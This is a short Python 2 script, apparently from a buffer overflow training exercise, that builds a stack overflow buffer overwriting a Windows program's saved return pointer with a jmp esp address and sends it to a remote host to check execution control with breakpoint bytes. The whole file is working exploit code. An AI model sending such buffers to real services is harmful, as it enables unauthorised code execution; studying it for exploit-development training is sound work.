#!/usr/bin/env python

# Uses a software interrupt to test the jmp esp functionality as part of the
# process in developing a Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import struct, functions

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()
ptr_jmp_esp = functions.getPtrJmpEsp()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s; ptr_jmp_esp=%s" % (RHOST, RPORT, buf_totlen, offset_srp, hex(ptr_jmp_esp))

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite. Converts to little endian
buf += "\xCC\xCC\xCC\xCC"               # ESP points here
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Caught software interrupt?"
